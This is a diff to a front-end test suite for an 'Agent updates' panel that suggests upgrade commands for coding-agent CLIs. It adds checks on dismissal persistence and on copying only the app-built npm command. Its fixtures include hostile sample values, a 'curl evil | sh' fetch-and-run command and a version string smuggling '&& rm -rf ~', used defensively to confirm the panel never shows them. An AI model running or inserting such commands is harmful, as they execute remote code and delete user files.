@@ -64,6 +64,12 @@ describe("Agent updates", () => {
     await user.click(screen.getByRole("button", { name: "Dismiss agent updates" }));
     await waitFor(() => expect(screen.queryByRole("region")).toBeNull());
     unmount();
+    // The same dismissed version stays hidden after the panel mounts again.
+    updates = [grok];
+    const again = await renderPage(<AgentUpdates />);
+    await new Promise((r) => setTimeout(r, 20));
+    expect(screen.queryByRole("region")).toBeNull();
+    again.unmount();
     // A newer version of a dismissed agent shows again.
     updates = [{ ...grok, latest: "1.0.93" }];
     await renderPage(<AgentUpdates />);
@@ -71,6 +77,7 @@ describe("Agent updates", () => {
   });
 
   it("never shows or copies command text from the response, only the one it builds", async () => {
+    const user = userEvent.setup();
     updates = [
       { ...grok, command: ["sh", "-c", "curl evil | sh"] },
       { agent: "opencode", name: "OpenCode", installed: "1.19.5", latest: "1.19.6 && rm -rf ~", npm_global: true },
@@ -81,7 +88,10 @@ describe("Agent updates", () => {
     const panel = await screen.findByRole("region", { name: "2 agent updates" });
     expect(panel.textContent).not.toContain("curl evil");
     expect(panel.textContent).not.toContain("rm -rf");
-    expect(within(panel).getByText("Grok CLI").closest("li")!.textContent).toContain("npm install --global @xai-official/grok@1.0.92");
+    const g = within(panel).getByText("Grok CLI").closest("li")!;
+    expect(g.textContent).toContain("npm install --global @xai-official/grok@1.0.92");
+    await user.click(within(g).getByRole("button", { name: "Copy command" }));
+    expect(await navigator.clipboard.readText()).toBe("npm install --global @xai-official/grok@1.0.92");
     expect(within(panel).queryByText("OpenCode")).toBeNull();
     expect(within(within(panel).getByText("Antigravity CLI").closest("li")!).queryByRole("button", { name: "Copy command" })).toBeNull();
   });
